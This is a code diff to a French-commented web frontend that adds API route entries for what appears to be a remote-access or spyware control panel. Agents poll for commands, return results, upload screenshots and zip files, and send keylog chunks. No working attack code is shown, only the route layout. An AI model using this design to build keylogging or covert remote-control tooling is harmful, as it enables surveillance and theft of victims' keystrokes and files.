@@ -6,9 +6,16 @@ import { cn } from '@/lib/utils'
 
 // Routes de l'API backend
 const API_ROUTES = [
-  { method: 'GET',  path: '/api/machines',        description: 'Liste toutes les machines' },
-  { method: 'POST', path: '/api/machines/report',  description: 'Check-in de l\'agent' },
-  { method: 'GET',  path: '/api/machines/:id',     description: 'Détails d\'une machine' },
+  { method: 'GET',  path: '/api/machines',                      description: 'Liste toutes les machines' },
+  { method: 'POST', path: '/api/machines/report',               description: 'Check-in initial de l\'agent' },
+  { method: 'GET',  path: '/api/machines/:id',                  description: 'Détails d\'une machine' },
+  { method: 'GET',  path: '/api/machines/:id/command',          description: 'Agent poll la commande en attente' },
+  { method: 'POST', path: '/api/machines/:id/command',          description: 'Frontend envoie une commande' },
+  { method: 'GET',  path: '/api/machines/:id/result',           description: 'Frontend récupère le résultat' },
+  { method: 'POST', path: '/api/machines/:id/result',           description: 'Agent envoie le résultat' },
+  { method: 'POST', path: '/api/machines/:id/upload',           description: 'Agent upload un fichier (screenshot, zip)' },
+  { method: 'POST', path: '/api/machines/:id/keylog',           description: 'Agent envoie un chunk de keylog' },
+  { method: 'GET',  path: '/api/machines/:id/download/:file',   description: 'Frontend télécharge un fichier' },
 ]
 
 // Stack technique utilisée dans le projet
